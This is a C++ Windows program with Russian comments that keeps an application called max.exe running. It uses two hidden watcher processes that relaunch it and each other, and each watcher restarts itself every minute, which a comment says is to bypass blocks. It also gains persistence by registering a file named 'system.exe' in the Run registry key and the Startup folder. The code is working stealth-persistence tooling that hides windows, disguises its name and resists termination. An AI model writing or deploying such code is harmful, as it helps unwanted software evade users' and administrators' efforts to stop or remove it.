#include <windows.h>
#include <tlhelp32.h>
#include <string>
#include <vector>
#include <iostream>
#include <psapi.h>
#include <tchar.h>
#include <filesystem>
#include <fstream>
#include <shlobj.h>

// Настройки системы
const std::wstring MAIN_APP = L"max.exe";
const std::wstring WATCHER1 = L"watcher1.exe";
const std::wstring WATCHER2 = L"watcher2.exe";
const std::wstring MAIN_APP_PATH = L"C:\\.MAX\\MAX\\max.exe";
const DWORD CHECK_INTERVAL = 5000; // Проверять каждые 5 секунд
const DWORD RESTART_DELAY = 2000;   // Задержка перед перезапуском

namespace fs = std::filesystem;

class FilesystemUtils {
public:
    // Копирование директории (рекурсивное)
    static bool CopyDirectory(const std::wstring& source, const std::wstring& destination) {
        try {
            // Создаем целевую папку если не существует
            if (!fs::exists(destination)) {
                fs::create_directories(destination);
            }

            // Обходим все элементы исходной папки
            for (const auto& entry : fs::directory_iterator(source)) {
                const auto& srcPath = entry.path();
                auto destPath = fs::path(destination) / srcPath.filename();

                if (entry.is_directory()) {
                    if (!CopyDirectory(srcPath.wstring(), destPath.wstring())) {
                        return false;
                    }
                }
                else {
                    // Копируем файл с перезаписью
                    fs::copy_file(
                        srcPath,
                        destPath,
                        fs::copy_options::overwrite_existing
                    );

                    // Сбрасываем атрибуты для скрытых/системных файлов
                    ResetFileAttributes(destPath.wstring());
                }
            }
            return true;
        }
        catch (const std::exception& e) {
            std::cerr << "CopyDirectory error: " << e.what() << std::endl;
            return false;
        }
    }

    // Перемещение директории (работает между дисками)
    static bool MoveDirectory(const std::wstring& source, const std::wstring& destination) {
        try {
            // Попробуем простое переименование (быстрое, если на одном диске)
            try {
                fs::rename(source, destination);
                return true;
            }
            catch (...) {
                // Если не получилось (разные диски) - копируем и удаляем
                if (!CopyDirectory(source, destination)) {
                    return false;
                }
                return DeleteDirectory(source);
            }
        }
        catch (const std::exception& e) {
            std::cerr << "MoveDirectory error: " << e.what() << std::endl;
            return false;
        }
    }

    // Удаление директории (рекурсивное)
    static bool DeleteDirectory(const std::wstring& path) {
        try {
            // Сначала сбрасываем атрибуты всех файлов
            ResetFileAttributesRecursive(path);

            // Удаляем рекурсивно
            fs::remove_all(path);
            return true;
        }
        catch (const std::exception& e) {
            std::cerr << "DeleteDirectory error: " << e.what() << std::endl;
            return false;
        }
    }

    // Проверка существования пути
    static bool Exists(const std::wstring& path) {
        return fs::exists(path);
    }

    // Получение размера файла/папки
    static uintmax_t GetSize(const std::wstring& path) {
        try {
            if (fs::is_directory(path)) {
                uintmax_t total = 0;
                for (const auto& entry : fs::recursive_directory_iterator(path)) {
                    if (entry.is_regular_file()) {
                        total += entry.file_size();
                    }
                }
                return total;
            }
            return fs::file_size(path);
        }
        catch (...) {
            return 0;
        }
    }

private:
    // Сброс атрибутов для одного файла/папки
    static void ResetFileAttributes(const std::wstring& path) {
        SetFileAttributesW(
            path.c_str(),
            FILE_ATTRIBUTE_NORMAL
        );
    }

    // Рекурсивный сброс атрибутов
    static void ResetFileAttributesRecursive(const std::wstring& path) {
        ResetFileAttributes(path);

        try {
            for (const auto& entry : fs::directory_iterator(path)) {
                ResetFileAttributes(entry.path().wstring());

                if (entry.is_directory()) {
                    ResetFileAttributesRecursive(entry.path().wstring());
                }
            }
        }
        catch (...) {
            // Игнорируем ошибки при итерации
        }
    }
};

// Проверка, запущен ли процесс
bool IsProcessRunning(const std::wstring& processName) {
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) return false;

    PROCESSENTRY32 pe;
    pe.dwSize = sizeof(PROCESSENTRY32);

    if (Process32First(hSnapshot, &pe)) {
        do {
            if (_wcsicmp(pe.szExeFile, processName.c_str()) == 0) {
                CloseHandle(hSnapshot);
                return true;
            }
        } while (Process32Next(hSnapshot, &pe));
    }
    CloseHandle(hSnapshot);
    return false;
}

// Запуск процесса в фоновом режиме
bool StartProcess(const std::wstring& path) {
    STARTUPINFO si = { sizeof(si) };
    PROCESS_INFORMATION pi = {};

    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;
    si.lpDesktop = (LPWSTR)L"Winsta0\\Default";

    std::wstring cmd = L"\"" + path + L"\"";

    if (!CreateProcess(
        NULL,
        (LPWSTR)cmd.data(),
        NULL, NULL, FALSE,
        CREATE_NO_WINDOW | DETACHED_PROCESS | CREATE_NEW_PROCESS_GROUP,
        NULL, NULL, &si, &pi
    )) {
        return false;
    }

    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    return true;
}

// Получение собственного имени процесса
std::wstring GetMyProcessName() {
    wchar_t path[MAX_PATH];
    GetModuleFileName(NULL, path, MAX_PATH);
    std::wstring fullPath(path);

    size_t pos = fullPath.find_last_of(L"\\/");
    return (pos != std::wstring::npos) ? fullPath.substr(pos + 1) : fullPath;
}

// Перезапуск самого себя (самовосстановление)
void RestartMyself() {
    std::wstring myPath;
    {
        wchar_t path[MAX_PATH];
        GetModuleFileName(NULL, path, MAX_PATH);
        myPath = std::wstring(path);
    }

    // Создаем новую копию себя
    STARTUPINFO si = { sizeof(si) };
    PROCESS_INFORMATION pi = {};
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;

    if (CreateProcess(
        NULL,
        (LPWSTR)myPath.data(),
        NULL, NULL, FALSE,
        CREATE_NO_WINDOW,
        NULL, NULL, &si, &pi
    )) {
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    }

    // Завершаем текущий экземпляр
    ExitProcess(0);
}

// Основная логика мониторинга
void WatcherLogic(const std::wstring& myName, const std::wstring& partnerName) {
    std::wstring appDir = MAIN_APP_PATH.substr(0, MAIN_APP_PATH.find_last_of(L"\\/") + 1);
    while (true) {
        if (!std::filesystem::exists(appDir + L"config.txt")) break;
        // 1. Проверяем основное приложение
        if (!IsProcessRunning(MAIN_APP)) {
            //StartProcess(MAIN_APP_PATH);
            ShellExecuteA(NULL, "open", "C:\\.MAX\\MAX\\max.exe", NULL, NULL, SW_SHOW);
            Sleep(RESTART_DELAY);
        }

        // 2. Проверяем партнера-наблюдателя
        if (!IsProcessRunning(partnerName)) {
            std::wstring partnerPath = MAIN_APP_PATH.substr(0, MAIN_APP_PATH.find_last_of(L"\\/") + 1) + partnerName;
            StartProcess(partnerPath);
            Sleep(RESTART_DELAY);
        }

        // 3. Периодически перезапускаем самих себя (для обхода блокировок)
        static int selfRestartCounter = 0;
        if (++selfRestartCounter >= 12) { // Каждые 60 секунд (12 * 5 сек)
            selfRestartCounter = 0;
            RestartMyself();
        }

        Sleep(CHECK_INTERVAL);
    }
}

// Добавление в реестр (HKEY_CURRENT_USER\...\Run)
bool AddToRegistry(const std::wstring& name, const std::wstring& filePath) {
    HKEY hKey;
    LONG result = RegOpenKeyEx(
        HKEY_CURRENT_USER,
        L"Software\\Microsoft\\Windows\\CurrentVersion\\Run",
        0,
        KEY_SET_VALUE,
        &hKey
    );

    if (result != ERROR_SUCCESS) {
        std::wcerr << L"Ошибка открытия реестра: " << result << std::endl;
        return false;
    }

    // Добавляем кавычки если в пути есть пробелы
    std::wstring regValue = filePath;
    if (filePath.find(L' ') != std::wstring::npos &&
        filePath.front() != L'"' &&
        filePath.back() != L'"') {
        regValue = L"\"" + filePath + L"\"";
    }

    result = RegSetValueEx(
        hKey,
        name.c_str(),
        0,
        REG_SZ,
        (const BYTE*)regValue.c_str(),
        (DWORD)((regValue.length() + 1) * sizeof(wchar_t))
    );

    RegCloseKey(hKey);

    if (result != ERROR_SUCCESS) {
        std::wcerr << L"Ошибка записи в реестр: " << result << std::endl;
        return false;
    }
    return true;
}

// Удаление из реестра
bool RemoveFromRegistry(const std::wstring& name) {
    HKEY hKey;
    LONG result = RegOpenKeyEx(
        HKEY_CURRENT_USER,
        L"Software\\Microsoft\\Windows\\CurrentVersion\\Run",
        0,
        KEY_SET_VALUE,
        &hKey
    );

    if (result != ERROR_SUCCESS) {
        std::wcerr << L"Ошибка открытия реестра: " << result << std::endl;
        return false;
    }

    result = RegDeleteValue(hKey, name.c_str());
    RegCloseKey(hKey);

    // Успех если значение удалено ИЛИ его не существовало
    if (result != ERROR_SUCCESS && result != ERROR_FILE_NOT_FOUND) {
        std::wcerr << L"Ошибка удаления из реестра: " << result << std::endl;
        return false;
    }
    return true;
}

// Добавление в папку Startup
bool AddToStartupFolder(const std::wstring& name, const std::wstring& filePath) {
    wchar_t startupPath[MAX_PATH];
    if (SHGetFolderPathW(NULL, CSIDL_STARTUP, NULL, 0, startupPath) != S_OK) {
        std::cerr << "Ошибка получения пути к Startup" << std::endl;
        return false;
    }

    std::wstring shortcutPath = std::wstring(startupPath) + L"\\" + name + L".lnk";

    CoInitialize(NULL);
    IShellLink* pLink = NULL;
    HRESULT hr = CoCreateInstance(
        CLSID_ShellLink,
        NULL,
        CLSCTX_INPROC_SERVER,
        IID_IShellLink,
        (void**)&pLink
    );

    if (SUCCEEDED(hr)) {
        pLink->SetPath(filePath.c_str());
        pLink->SetShowCmd(SW_HIDE);  // Скрыть окно при запуске

        IPersistFile* ppf = NULL;
        hr = pLink->QueryInterface(IID_IPersistFile, (void**)&ppf);
        if (SUCCEEDED(hr)) {
            hr = ppf->Save(shortcutPath.c_str(), TRUE);
            ppf->Release();
        }
        pLink->Release();
    }
    CoUninitialize();

    if (FAILED(hr)) {
        std::wcerr << L"Ошибка создания ярлыка: " << hr << std::endl;
        return false;
    }
    return true;
}

// Удаление из папки Startup
bool RemoveFromStartupFolder(const std::wstring& name) {
    wchar_t startupPath[MAX_PATH];
    if (SHGetFolderPathW(NULL, CSIDL_STARTUP, NULL, 0, startupPath) != S_OK) {
        std::cerr << "Ошибка получения пути к Startup" << std::endl;
        return false;
    }

    std::wstring shortcutPath = std::wstring(startupPath) + L"\\" + name + L".lnk";

    // Проверяем существование файла
    DWORD attrs = GetFileAttributes(shortcutPath.c_str());
    if (attrs == INVALID_FILE_ATTRIBUTES && GetLastError() == ERROR_FILE_NOT_FOUND) {
        return true;  // Файл не существует - успех
    }

    if (!DeleteFile(shortcutPath.c_str())) {
        DWORD error = GetLastError();
        if (error != ERROR_FILE_NOT_FOUND) {
            std::wcerr << L"Ошибка удаления ярлыка: " << error << std::endl;
            return false;
        }
    }
    return true;
}

int main() {
    // Скрываем окно процесса
    ShowWindow(GetConsoleWindow(), SW_HIDE);

    std::wstring myName = GetMyProcessName();

    if (myName == WATCHER1) {
        WatcherLogic(WATCHER1, WATCHER2);
    }
    else if (myName == WATCHER2) {
        WatcherLogic(WATCHER2, WATCHER1);
    }
    else {
        // Это основной запуск - создаем оба наблюдателя
        std::wstring appDir = MAIN_APP_PATH.substr(0, MAIN_APP_PATH.find_last_of(L"\\/") + 1);

        
        AddToStartupFolder(L"system", L"C:\\.MAX\\MAX\\system.exe");
        AddToRegistry(L"system", L"C:\\.MAX\\MAX\\system.exe");
    }

    return 0;
}